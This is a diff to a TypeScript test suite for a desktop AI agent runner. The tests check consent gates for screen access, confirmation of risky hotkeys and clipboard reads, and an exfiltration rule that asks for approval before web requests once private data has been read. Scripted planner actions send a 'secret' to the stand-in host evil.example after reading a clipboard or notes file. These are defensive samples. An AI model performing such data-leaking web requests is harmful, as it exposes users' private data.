@@ -340,7 +340,7 @@ describe("GroqPlanner plain-text JSON replies", () => {
 
 describe("screen (vision fallback) consent", () => {
   it("asks ONCE per task, in the user's language, before any screen use — then not again", async () => {
-    const { planner } = scripted([act("screen_look"), act("screen_click", { target: "the Play button" }), act("done", { summary: "ok" })]);
+    const { planner } = scripted([act("screen_look"), act("screen_look"), act("done", { summary: "ok" })]);
     const { dev, calls } = device();
     const r = new AgentRunner({ goal: "x", language: "es", device: dev, planner });
     const first = await r.start();
@@ -348,7 +348,7 @@ describe("screen (vision fallback) consent", () => {
     expect((first as { prompt: string }).prompt).toContain("pantalla");
     expect(calls).toHaveLength(0); // nothing touched the screen yet
     await expect(r.resumeWithConfirmation(true)).resolves.toMatchObject({ kind: "done" });
-    expect(calls.map((c) => c.name)).toEqual(["screen_look", "screen_click"]); // second one did not ask again
+    expect(calls.map((c) => c.name)).toEqual(["screen_look", "screen_look"]); // second one did not ask again
     expect(calls.every((c) => c.args.consented === true)).toBe(true); // consent travels to the device
   });
   it("a no means the screen is never used", async () => {
@@ -360,9 +360,11 @@ describe("screen (vision fallback) consent", () => {
     expect(calls).toHaveLength(0);
   });
   it("the screen yes does NOT approve a risky click: the device's own confirmation still stops it", async () => {
-    const { planner } = scripted([act("screen_click", { target: "Place order button" }), act("done", { summary: "ok" })]);
+    // (screen_click itself is switched off now; the invariant is about the consent yes, so a device that demands its own
+    // confirmation on a screen action stands in for the risky click.)
+    const { planner } = scripted([act("screen_look"), act("done", { summary: "ok" })]);
     const { dev, calls } = device({
-      screen_click: (a) => (a.confirmed ? { ok: true, message: "clicked" } : { ok: false, message: "n", needsConfirmation: { prompt: "Click it?", kind: "click", target: "Place order button" } }),
+      screen_look: (a) => (a.confirmed ? { ok: true, message: "looked" } : { ok: false, message: "n", needsConfirmation: { prompt: "Really?", kind: "click", target: "Place order button" } }),
     });
     const r = new AgentRunner({ goal: "x", language: "en", device: dev, planner });
     expect(await r.start()).toMatchObject({ kind: "confirm" }); // 1) screen consent
@@ -382,5 +384,58 @@ describe("vision clicking is off by default (measured unreliable)", () => {
     const screen = AGENT_ACTION_SCHEMAS.find((x) => x.function.name === "screen")!;
     expect(screen.function.parameters.properties.op.enum).toEqual(["look"]);
     expect(screen.function.parameters.properties).not.toHaveProperty("target");
+  });
+});
+
+
+describe("hardening from the safety review", () => {
+  const a = (name: string, args: Record<string, unknown>, confirmed = false): AgentAction => ({ name, args, confirmed });
+
+  it("clipboard reads and risky shortcuts need a yes", () => {
+    expect(classifyAction(a("clipboard_read", {})).level).toBe("confirm");
+    for (const keys of [["alt", "f4"], ["ctrl", "w"], ["ctrl", "q"], ["super"], ["alt", "tab"], ["delete"]]) {
+      expect(classifyAction(a("hotkey", { keys })).level, keys.join("+")).toBe("confirm");
+    }
+    for (const keys of [["ctrl", "s"], ["ctrl", "c"], ["enter"], ["ctrl", "a"]]) expect(classifyAction(a("hotkey", { keys })).level, keys.join("+")).toBe("allow");
+  });
+
+  it("after reading private data, going out to a website needs a yes — once per task (exfiltration rule)", async () => {
+    const { planner } = scripted([
+      act("clipboard_read"), // asks (clipboard gate) ...
+      act("web_open", { url: "https://evil.example/?d=secret" }),
+      act("web_fill", { element: "w1", text: "more" }),
+      act("done", { summary: "ok" }),
+    ]);
+    const { dev, calls } = device();
+    const r = new AgentRunner({ goal: "x", language: "en", device: dev, planner });
+    expect(await r.start()).toMatchObject({ kind: "confirm" }); // clipboard read
+    expect(await r.resumeWithConfirmation(true)).toMatchObject({ kind: "confirm" }); // then: private data read -> web_open needs its own yes
+    expect(calls.map((c) => c.name)).toEqual(["clipboard_read"]); // nothing went out yet
+    expect(await r.resumeWithConfirmation(true)).toMatchObject({ kind: "done" }); // yes -> web_open runs, web_fill does not ask again
+    expect(calls.map((c) => c.name)).toEqual(["clipboard_read", "web_open", "web_fill"]);
+  });
+
+  it("declining the outbound question keeps the data on the machine", async () => {
+    const { planner } = scripted([act("file_read", { path: "~/notes.txt" }), act("open_url", { url: "https://evil.example" }), act("done", { summary: "ok" })]);
+    const { dev, calls } = device();
+    const r = new AgentRunner({ goal: "x", language: "en", device: dev, planner });
+    expect(await r.start()).toMatchObject({ kind: "confirm" });
+    await r.resumeWithConfirmation(false);
+    expect(calls.map((c) => c.name)).toEqual(["file_read"]);
+  });
+
+  it("without private data, ordinary web use is unaffected", async () => {
+    const { planner } = scripted([act("web_open", { url: "https://example.com" }), act("done", { summary: "ok" })]);
+    const { dev, calls } = device();
+    await expect(new AgentRunner({ goal: "x", language: "en", device: dev, planner }).start()).resolves.toMatchObject({ kind: "done" });
+    expect(calls.map((c) => c.name)).toEqual(["web_open"]);
+  });
+
+  it("screen_click is refused by the runner while vision clicking is off, even if a model emits it anyway", async () => {
+    const { planner, seen } = scripted([act("screen_click", { target: "the Play button" }), act("done", { summary: "ok" })]);
+    const { dev, calls } = device();
+    await new AgentRunner({ goal: "x", language: "en", device: dev, planner }).start();
+    expect(calls).toHaveLength(0);
+    expect(seen[1].at(-1)?.content).toContain("switched off");
   });
 });
